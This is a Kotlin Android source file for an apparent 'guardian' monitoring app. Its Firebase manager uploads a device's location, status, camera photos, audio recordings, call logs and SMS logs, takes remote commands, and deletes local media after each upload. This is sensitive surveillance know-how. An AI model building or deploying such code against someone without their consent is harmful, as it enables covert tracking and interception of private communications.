package com.salzkreis.guardian.managers

import android.content.Context
import android.content.SharedPreferences
import android.net.Uri
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.tasks.await
import java.io.File

class FirebaseManager(private val context: Context) {

    private val prefs: SharedPreferences = context.getSharedPreferences("guardian", Context.MODE_PRIVATE)
    private val db = FirebaseFirestore.getInstance()
    private val storage = FirebaseStorage.getInstance()
    private val auth = FirebaseAuth.getInstance()

    val deviceId: String get() = prefs.getString("device_id", "") ?: ""
    private val deviceRef get() = db.collection("devices").document(deviceId)

    fun isConfigured() = deviceId.isNotEmpty() && auth.currentUser != null

    suspend fun signInAndConfigure(email: String, password: String, deviceId: String) {
        try {
            auth.createUserWithEmailAndPassword(email, password).await()
        } catch (e: Exception) {
            auth.signInWithEmailAndPassword(email, password).await()
        }
        prefs.edit().putString("device_id", deviceId).apply()
        deviceRef.set(
            mapOf(
                "device_id" to deviceId,
                "created_at" to FieldValue.serverTimestamp(),
                "status" to mapOf("battery" to 0, "charging" to false),
                "commands" to mapOf<String, Any>()
            ),
            com.google.firebase.firestore.SetOptions.merge()
        ).await()
    }

    suspend fun uploadLocation(lat: Double, lng: Double, accuracy: Float) {
        val data = mapOf(
            "lat" to lat,
            "lng" to lng,
            "accuracy" to accuracy,
            "timestamp" to FieldValue.serverTimestamp()
        )
        deviceRef.update("location", data).await()
        deviceRef.collection("locations").add(data).await()
    }

    suspend fun uploadStatus(battery: Int, charging: Boolean, wifi: String?, mobile: Boolean) {
        deviceRef.update(
            mapOf(
                "status.battery" to battery,
                "status.charging" to charging,
                "status.wifi" to (wifi ?: ""),
                "status.mobile_data" to mobile,
                "status.last_seen" to FieldValue.serverTimestamp()
            )
        ).await()
    }

    fun listenForCommands(onCommand: (String, Map<String, Any>) -> Unit): ListenerRegistration {
        return deviceRef.addSnapshotListener { snap, _ ->
            @Suppress("UNCHECKED_CAST")
            val commands = snap?.get("commands") as? Map<String, Any> ?: return@addSnapshotListener
            commands.forEach { (key, value) ->
                if (value is Map<*, *>) {
                    val done = value["done"] as? Boolean ?: false
                    if (!done) {
                        onCommand(key, value as Map<String, Any>)
                        deviceRef.update("commands.$key.done", true)
                    }
                }
            }
        }
    }

    suspend fun uploadPhoto(file: File, camera: String) {
        val ref = storage.reference.child("devices/$deviceId/photos/${file.name}")
        ref.putFile(Uri.fromFile(file)).await()
        val url = ref.downloadUrl.await().toString()
        deviceRef.collection("media").add(
            mapOf(
                "type" to "photo",
                "url" to url,
                "camera" to camera,
                "timestamp" to FieldValue.serverTimestamp()
            )
        ).await()
        file.delete()
    }

    suspend fun uploadAudio(file: File) {
        val ref = storage.reference.child("devices/$deviceId/recordings/${file.name}")
        ref.putFile(Uri.fromFile(file)).await()
        val url = ref.downloadUrl.await().toString()
        deviceRef.collection("media").add(
            mapOf(
                "type" to "audio",
                "url" to url,
                "timestamp" to FieldValue.serverTimestamp()
            )
        ).await()
        file.delete()
    }

    fun setRecordingState(recording: Boolean) {
        deviceRef.update("status.recording", recording)
    }

    suspend fun uploadCallLogs(logs: List<Map<String, Any>>) {
        if (logs.isEmpty()) return
        val batch = db.batch()
        val ref = deviceRef.collection("call_logs")
        logs.forEach { batch.set(ref.document(), it) }
        batch.commit().await()
    }

    suspend fun uploadSmsLogs(logs: List<Map<String, Any>>) {
        if (logs.isEmpty()) return
        val batch = db.batch()
        val ref = deviceRef.collection("sms_logs")
        logs.forEach { batch.set(ref.document(), it) }
        batch.commit().await()
    }

    fun updateFcmToken(token: String) {
        if (deviceId.isEmpty()) return
        deviceRef.update("fcm_token", token)
    }
}
